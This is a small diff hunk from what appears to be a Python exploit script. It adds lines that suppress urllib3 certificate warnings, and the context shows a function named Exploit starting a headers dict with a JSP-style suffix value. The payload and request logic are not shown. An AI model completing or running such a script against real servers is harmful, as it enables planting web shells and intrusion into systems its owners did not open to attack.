@@ -3,6 +3,8 @@
 import requests
 import argparse
 from urllib.parse import urljoin
+from requests.packages import urllib3
+urllib3.disable_warnings()
 
 def Exploit(url):
     headers = {"suffix":"%>//",
